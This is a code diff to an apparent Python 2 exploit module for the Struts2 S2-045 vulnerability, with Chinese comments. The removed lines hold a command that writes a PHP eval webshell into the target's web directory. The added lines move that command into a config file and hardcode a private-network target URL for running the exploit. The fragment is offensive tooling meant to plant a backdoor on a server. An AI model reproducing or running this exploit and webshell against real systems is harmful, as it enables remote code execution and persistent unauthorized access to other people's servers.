@@ -3,8 +3,9 @@ import sys
 import re
 import urllib2
 import httplib
-from exp_template import Exploit, Level
+from struts2.exp_template import Exploit, Level
 
+from conf import config
 """
 构造函数需要传递一下参数
 url   测试目标的url
@@ -76,7 +77,7 @@ class S2045(Exploit):
         webpath = self.getwebpath()
         if webpath:
             # 写入webshell
-            cmd = '''echo "<?php @eval($_POST[__RANDPASS__]); ?>" > {}shell01.jsp'''.format(webpath)
+            cmd = config['webshell'].format(webpath)
             self.executecmd(cmd)
             return True
         else:
@@ -84,8 +85,12 @@ class S2045(Exploit):
 
 
 if __name__ == '__main__':
-    if len(sys.argv) == 2:
-        s = S2045(sys.argv[1])
-        res = s.exploit()
-        print res
+    url = 'http://192.168.40.26:8081'
+    s = S2045(url)
+    res = s.exploit()
+    print res
+    # if len(sys.argv) == 2:
+    #     s = S2045(sys.argv[1])
+    #     res = s.exploit()
+    #     print res
 
